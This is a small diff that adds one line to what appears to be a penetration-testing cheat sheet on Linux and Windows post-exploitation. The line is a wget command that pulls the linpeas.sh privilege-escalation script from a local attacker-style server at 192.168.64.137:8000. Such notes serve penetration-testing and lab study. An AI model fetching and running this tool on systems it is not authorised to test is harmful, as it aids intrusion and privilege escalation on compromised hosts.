@@ -55,6 +55,8 @@ crontab -l
 
 **Linux wget and curl commands**
 
+wget http://192.168.64.137:8000/linpeas.sh -O linpeas.sh
+
 ## Windows Post Exploitation
 cd
 
